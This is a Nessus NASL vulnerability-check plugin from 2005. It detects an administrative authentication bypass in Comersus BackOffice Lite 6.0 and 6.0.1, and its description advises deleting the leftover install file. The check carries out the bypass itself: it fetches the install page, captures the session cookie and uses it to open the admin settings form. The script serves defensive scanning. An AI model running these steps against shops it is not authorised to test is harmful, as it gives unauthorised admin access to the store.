#
# Script by Noam Rathaus GPLv2
#
# Subject: bug report comersus Back Office Lite 6.0 and 6.0.1
# From: "raf somers" <beltech2bugtraq@hotmail.com>
# Date: 2005-01-21 18:07

if(description)
{
 script_id(16227);
 script_version("$Revision: 1.2 $");
 script_bugtraq_id(12362);
 
 name["english"] = "Comersus BackOffice Lite Administrative Bypass";

 script_name(english:name["english"]);
 
 desc["english"] = "
Comersus ASP shopping cart is a set of ASP scripts creating an online 
shoppingcart. It works on a database of your own choosing, default is 
msaccess, and includes online administration tools.

By accessing the /comersus_backoffice_install10.asp file it is possible
to bypass the need to authenticate as an administrative user.

Solution: Delete the file '/comersus_backoffice_install10.asp' from the
server as it is not needed after the installation process has been
completed.

Risk factor: High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of a BackOffice Lite Administrative Bypass";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2005 Noam Rathaus");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

if(!get_port_state(port))exit(0);

function check(loc)
{
 req = http_get(item: string(loc, "/comersus_backoffice_install10.asp"), port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL )exit(0);
 if('Installation complete' >< r && 'Final Step' >< r && 'Installation Wizard' >< r)
 {
  v = eregmatch(pattern: "Set-Cookie[0-9]?: *([^; ]+)", string: r);

  if (!isnull(v))
  {
   cookie = v[1];
   req = string("GET ", loc, "/comersus_backoffice_settingsModifyForm.asp HTTP/1.1\r\n",
   				"Host: ", get_host_name(), ":", port, "\r\n",
				"Cookie: ", cookie, "\r\n",
				"\r\n");
									
   r = http_keepalive_send_recv(port:port, data:req);
   if (r == NULL) exit(0);
   if ('Modify Store Settings' >< r && 'Basic Admin Utility' >< r)
   {
    security_hole(port:port);
    exit(0);
   }
  }
 }
}

foreach dir (make_list("/comersus/backofficeLite", "/comersus", cgi_dirs()))
{
 check(loc:dir);
}

